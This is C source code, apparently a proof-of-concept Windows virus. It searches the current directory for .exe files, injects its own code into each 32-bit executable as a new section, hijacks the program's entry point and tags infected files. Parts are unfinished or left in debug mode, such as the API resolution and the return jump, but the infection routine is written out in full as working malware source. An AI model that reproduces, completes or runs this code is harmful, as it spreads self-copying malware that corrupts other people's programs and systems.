#include <Windows.h>
#include <winternl.h>
#include <minwindef.h>
#include <minwinbase.h>
#include <winnt.h>

#pragma code_seg(".advance")

//======================================================================
// fileapi.h
typedef HANDLE (WINAPI *__FindFirstFileA) (
    _In_ LPCSTR lpFileName,
    _Out_ LPWIN32_FIND_DATAA lpFindFileData
);
typedef BOOL (WINAPI *__FindNextFileA) (
    _In_ HANDLE hFindFile,
    _Out_ LPWIN32_FIND_DATAA lpFindFileData
);
typedef BOOL (WINAPI *__FindClose) (
    _Inout_ HANDLE hFindFile
);
typedef HANDLE (WINAPI *__CreateFileA) (
    _In_ LPCSTR lpFileName,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_ DWORD dwCreationDisposition,
    _In_ DWORD dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile
);
typedef BOOL (WINAPI *__WriteFile) (
    _In_ HANDLE hFile,
    _In_reads_bytes_opt_(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToWrite,
    _Out_opt_ LPDWORD lpNumberOfBytesWritten,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef BOOL (WINAPI *__ReadFile) (
    _In_ HANDLE hFile,
    _Out_writes_bytes_to_opt_(nNumberOfBytesToRead, *lpNumberOfBytesRead) __out_data_source(FILE) LPVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToRead,
    _Out_opt_ LPDWORD lpNumberOfBytesRead,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);
typedef DWORD (WINAPI *__SetFilePointer) (
    _In_ HANDLE hFile,
    _In_ LONG lDistanceToMove,
    _Inout_opt_ PLONG lpDistanceToMoveHigh,
    _In_ DWORD dwMoveMethod
);
typedef BOOL (WINAPI *__SetEndOfFile) (
    _In_ HANDLE hFile
);
typedef DWORD (WINAPI *__GetFileSize) (
    _In_ HANDLE hFile,
    _Out_opt_ LPDWORD lpFileSizeHigh
);
// handleapi.h
typedef BOOL (WINAPI *__CloseHandle) (
    _In_ _Post_ptr_invalid_ HANDLE hObject
);
//======================================================================

typedef struct SHELL_CODE_SUPER_BLOCK {
    // code info
    PBYTE _shellCode;
    DWORD _JMP_POINT_OFFSET;
    DWORD _CODE_SIZE;
    // function
    __FindFirstFileA _FindFirstFileA;
    __FindNextFileA _FindNextFileA;
    __FindClose _FindClose;
    __CreateFileA _CreateFileA;
    __WriteFile _WriteFile;
    __ReadFile _ReadFile;
    __SetFilePointer _SetFilePointer;
    __SetEndOfFile _SetEndOfFile;
    __GetFileSize _GetFileSize;
    __CloseHandle _CloseHandle;
    // headers
    IMAGE_DOS_HEADER dosHdr;
    IMAGE_FILE_HEADER fileHdr;
    IMAGE_OPTIONAL_HEADER32 optHdr;
    IMAGE_SECTION_HEADER lasSecHdr, newSecHdr;
} SCSB;

//======================================================================

#define shellCode sb->_shellCode
#define JMP_POINT_OFFSET sb->_JMP_POINT_OFFSET
#define CODE_SIZE sb->_CODE_SIZE

#define DEBUG_STATIC // use api static
#define DEBUG_STAND_OUTPUT // use stdio

#ifdef DEBUG_STAND_OUTPUT
#include <stdio.h>
#include <string.h>
#endif

#ifndef DEBUG_STATIC
#define FindFirstFileA sb->_FindFirstFileA
#define FindNextFileA sb->_FindNextFileA
#define FindClose sb->_FindClose
#define CreateFileA sb->_CreateFileA
#define WriteFile sb->WriteFile
#define ReadFile sb->_ReadFile
#define SetFilePointer sb->_SetFilePointer
#define SetEndOfFile sb->_SetEndOfFile
#define GetFileSize sb->_GetFileSize
#define CloseHandle sb->_CloseHandle
#else
#include <fileapi.h>
#include <handleapi.h>
#endif

//======================================================================

__forceinline int ReadOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
    if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
        puts("Error when set file pointor!");
        return 1;
    }
    if(ReadFile(hFile, buf, size, NULL, NULL) == FALSE) {
        puts("Error when read file!");
        return 2;
    }
    return 0;
}
__forceinline int WriteOffset(SCSB *sb, HANDLE hFile, long offset, long mode, void* buf, long size) {
    if(SetFilePointer(hFile, offset, NULL, mode) == INVALID_SET_FILE_POINTER) {
        puts("Error when set file pointor!");
        return 1;
    }
    if(WriteFile(hFile, buf, size, NULL, NULL) == FALSE) {
        puts("Error when write file!");
        return 2;
    }
    return 0;
}
__forceinline int SetFileSize(SCSB *sb, HANDLE hFile, long size) {
    if(SetFilePointer(hFile, size, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        puts("Error when set file pointor!");
        return 1;
    }
    if(SetEndOfFile(hFile) == FALSE) {
        puts("Error when modify size!");
        return 2;
    }
    return 0;
}

//======================================================================

__forceinline HANDLE OpenTargetA(SCSB *sb, CHAR *name) {
    HANDLE hFile = CreateFileA(
        name,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    return hFile;
}

__forceinline int InfectTarget(SCSB *sb, HANDLE hFile) {
    int err = 0;
//----------------------------------------------------------------------
    puts("Init header pointers...");
    // headers
    /* init in struct SCSB */
    // headers pointer
    PIMAGE_DOS_HEADER pDosHdr = &sb->dosHdr;
    PIMAGE_FILE_HEADER pFileHdr = &sb->fileHdr;
    PIMAGE_OPTIONAL_HEADER32 pOptHdr = &sb->optHdr;
    PIMAGE_SECTION_HEADER pLasSecHdr = &sb->lasSecHdr;
    PIMAGE_SECTION_HEADER pNewSecHdr = &sb->newSecHdr;
//----------------------------------------------------------------------
    puts("Parse headers...");
    // Get DOS Header
    err = ReadOffset(
        sb, hFile, 0, FILE_BEGIN, 
        pDosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    if(err) return -1;
    // Check infected
    if(pDosHdr->e_res[0] == 0x1234) {
        puts("Error: Target has been infected!");
        return 1;
    }
    // Check Signature
    DWORD pe00;
    err = ReadOffset(
        sb, hFile, pDosHdr->e_lfanew, FILE_BEGIN,
        (PVOID)&pe00, sizeof(DWORD)
    );
    if(err) return -1;
    if(pe00 != 0x00004550) {
        puts("Error: Not a pe file!");
        return 2;
    }
    // Get File Header
    err = ReadOffset(
        sb, hFile, 0, FILE_CURRENT, 
        pFileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    if(err) return -1;
    // Get Optional Header
    err = ReadOffset(
        sb, hFile, 0, FILE_CURRENT, 
        pOptHdr, 
        /* 224 when 32 bits, same as pFileHdr->SizeOfOptionalHeader */
        sizeof(IMAGE_OPTIONAL_HEADER32) 
    );
    if(err) return -1;
    if(pOptHdr->Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC) {
        puts("Error: Not a 32 bits exe!");
        return 3;
    }
    // Check Headers Space
    long currentSize = \
        pFileHdr->NumberOfSections * sizeof(IMAGE_SECTION_HEADER) \
        + pDosHdr->e_lfanew + 0x4 \
        + sizeof(IMAGE_FILE_HEADER) \
        + pFileHdr->SizeOfOptionalHeader;
    long alignSize = pOptHdr->SizeOfHeaders;
    if(currentSize + sizeof(IMAGE_SECTION_HEADER) > alignSize) {
        puts("Error: No space to insert a new sections!");
        return 4;
    }
    // Get Last Section Header
    err = ReadOffset(
        sb, hFile, currentSize - sizeof(IMAGE_SECTION_HEADER), FILE_BEGIN, 
        pLasSecHdr, sizeof(IMAGE_SECTION_HEADER)
    );
    if(err) return -1;
//----------------------------------------------------------------------
    puts("Calc address...");
    // Get align
    long fileAlign = pOptHdr->FileAlignment;
    long secAlign = pOptHdr->SectionAlignment; 
    // Set old entry VA
    printf("%p %d %d\n", shellCode, JMP_POINT_OFFSET, CODE_SIZE);
    long oldVA = pOptHdr->AddressOfEntryPoint;
    long *jmpPoint = (void *)(shellCode + JMP_POINT_OFFSET);
    // *jmpPoint = oldVA; !!! you can't exit readonly mem 
    // Calc New Section raw
    long rawNewSec = pLasSecHdr->PointerToRawData + pLasSecHdr->SizeOfRawData;
    // Calc New Section rva 
    long lasVirSize = pLasSecHdr->Misc.VirtualSize;
    if(lasVirSize % secAlign != 0) lasVirSize = (lasVirSize / secAlign + 1) * secAlign;
    long rvaNewSec = pLasSecHdr->VirtualAddress + lasVirSize;
    // Calc New Section raw size
    long raw_size = CODE_SIZE;
    if(CODE_SIZE % fileAlign != 0) raw_size = (CODE_SIZE / fileAlign + 1) * fileAlign;
    // Calc New Section image size
    int vir_size = CODE_SIZE;
    if(CODE_SIZE % secAlign != 0) vir_size = (CODE_SIZE / secAlign + 1) * secAlign;
    // Set New Section Header
    char *sName = pNewSecHdr->Name;
    sName[0] = '.', sName[1] = 'e', sName[2] = 'x';
    pNewSecHdr->Misc.VirtualSize = CODE_SIZE;
    pNewSecHdr->VirtualAddress = rvaNewSec;
    pNewSecHdr->SizeOfRawData = raw_size;
    pNewSecHdr->PointerToRawData = rawNewSec;
    pNewSecHdr->PointerToRelocations = 0;
    pNewSecHdr->PointerToLinenumbers = 0;
    pNewSecHdr->NumberOfRelocations = 0;
    pNewSecHdr->NumberOfLinenumbers = 0;
    pNewSecHdr->Characteristics = \
        IMAGE_SCN_CNT_CODE | IMAGE_SCN_ALIGN_32BYTES | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
    // Set Infected tag
    pDosHdr->e_res[0] = 0x1234;
    // Fix File Header
    pFileHdr->NumberOfSections++;
    // Fix Optional Header
    pOptHdr->AddressOfEntryPoint = rvaNewSec;
    pOptHdr->SizeOfImage = rvaNewSec + vir_size;
//----------------------------------------------------------------------
    puts("Save changing...");
    // Saved Dos Header
    err = WriteOffset(
        sb, hFile, 0, FILE_BEGIN,
        pDosHdr, sizeof(IMAGE_DOS_HEADER)
    );
    if(err) return -1;
    // Saved File Header
    err = WriteOffset(
        sb, hFile, pDosHdr->e_lfanew + 0x4, FILE_BEGIN,
        pFileHdr, sizeof(IMAGE_FILE_HEADER)
    );
    if(err) return -1;
    // Saved Optional Header
    err = WriteOffset(
        sb, hFile, 0, FILE_CURRENT,
        pOptHdr,
        sizeof(IMAGE_OPTIONAL_HEADER32)
    );
    if(err) return -1;
    // Saved New Section Header
    err = WriteOffset(
        sb, hFile, currentSize, FILE_BEGIN,
        pNewSecHdr,
        sizeof(IMAGE_SECTION_HEADER)
    );
    if(err) return -1;
    // Saved New Section
    err = WriteOffset(
        sb, hFile, rawNewSec, FILE_BEGIN,
        shellCode, CODE_SIZE
    );
    if(err) return -1;
    // Fix jmp point
    err = WriteOffset(
        sb, hFile, rawNewSec + JMP_POINT_OFFSET, FILE_BEGIN,
        &oldVA, sizeof(DWORD)
    );
    if(err) return -1;
    // Alignment
    err = SetFileSize(sb, hFile, rawNewSec + raw_size);
    if(err) return -1;
//----------------------------------------------------------------------
    return 0;
}

//======================================================================

__forceinline void ShellCodeMain(SCSB *sb) {
    // find exe in cwd
    CHAR search[6] = {'*', '.', 'e', 'x', 'e', 0};
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(search, &findData);
    if(hFind == INVALID_HANDLE_VALUE) return;
    // iterate files
    LPWIN32_FIND_DATAA lpFindData = &findData;
    do {
        puts(lpFindData->cFileName);
        HANDLE hf = OpenTargetA(sb, lpFindData->cFileName);
        if(hf == NULL) continue;
        InfectTarget(sb, hf);
        CloseHandle(hf);
    } while(FindNextFileA(hFind, lpFindData));
    FindClose(hFind);
    return;
}

//======================================================================


//======================================================================

void ShellCode() {
__code_start:
    SCSB super_block;
    SCSB *sb = &super_block;
    PPEB peb;
    PBYTE imageBase;
    // get peb
    __asm {
        mov eax, fs:[30h];
        mov peb, eax
    }
    // get imageBase
    imageBase = (PBYTE)*(DWORD*)(peb + 0x8);
    // Get funtion pointer
    // pass
    // Get Code info
    PBYTE codeAdr;
    DWORD codeSize, jmpPoint;
    __asm {
        mov eax, __code_start
        mov codeAdr, eax
        mov eax, __code_end
        sub eax, __code_start
        mov codeSize, eax
        mov eax, __jmp_point
        sub eax, __code_start
        add eax, 1
        mov jmpPoint, eax
    }
    sb->_shellCode = codeAdr;
    sb->_CODE_SIZE = codeSize;
    sb->_JMP_POINT_OFFSET = jmpPoint;
    // Start infecting
    ShellCodeMain(sb);
    // Return back
    __asm {
        mov eax, imageBase
__jmp_point:
        add eax, 0x11223344
        ;jmp eax
    }
__code_end:
    return;
}

int main() {
    ShellCode();
    return 0;
}